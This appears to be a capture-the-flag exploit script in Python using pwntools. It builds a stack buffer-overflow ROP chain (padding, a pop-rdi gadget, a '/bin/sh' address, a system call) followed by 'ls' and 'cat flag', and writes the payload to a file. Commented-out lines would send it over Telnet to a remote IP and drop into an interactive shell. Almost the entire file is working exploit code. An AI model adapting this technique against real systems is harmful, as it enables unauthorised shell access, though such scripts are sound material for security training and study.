# from telnetlib import Telnet
import pwnlib


def generate_payload():
    pwnlib.context.context.update(arch='amd64', os='linux')
    eip_offset = 40
    # sys_ls = 0x4007c5
    set_rdi = 0x4007bf
    sys_rdi = 0x4007cc
    sh_bin  = 0x6010b1

    payload = b'A' * eip_offset
    # payload += pwnlib.util.packing.p64(sys_ls)
    payload += pwnlib.util.packing.p64(set_rdi)
    payload += pwnlib.util.packing.p64(sh_bin)
    payload += pwnlib.util.packing.p64(sys_rdi)
    payload += b'\nls\ncat flag\n'

    return payload


def run():
    # r = Telnet('46.101.107.117', 2112)
    # r.read_until(b'> ')

    payload = generate_payload()
    with open('payload', 'wb') as payF:
        payF.write(payload)
    # r.write(payload)
    # s = r.read_until(b'\n')


run()



# # r.read_until(b'\033[H\033[J\033[8;0H')
# # log.info('enjoy your shell :)')
# r.interact()
